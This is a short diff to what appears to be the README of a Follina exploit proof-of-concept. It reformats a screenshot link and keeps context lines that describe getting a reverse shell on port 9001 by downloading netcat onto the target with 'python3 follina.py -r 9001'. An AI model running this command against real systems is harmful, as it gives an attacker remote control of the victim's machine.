@@ -47,4 +47,4 @@ Get a reverse shell on port 9001. **Note, this downloads a netcat binary _onto t
 $ python3 follina.py -r 9001
 ```
 
-https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png
+![Reverse Shell](https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png)
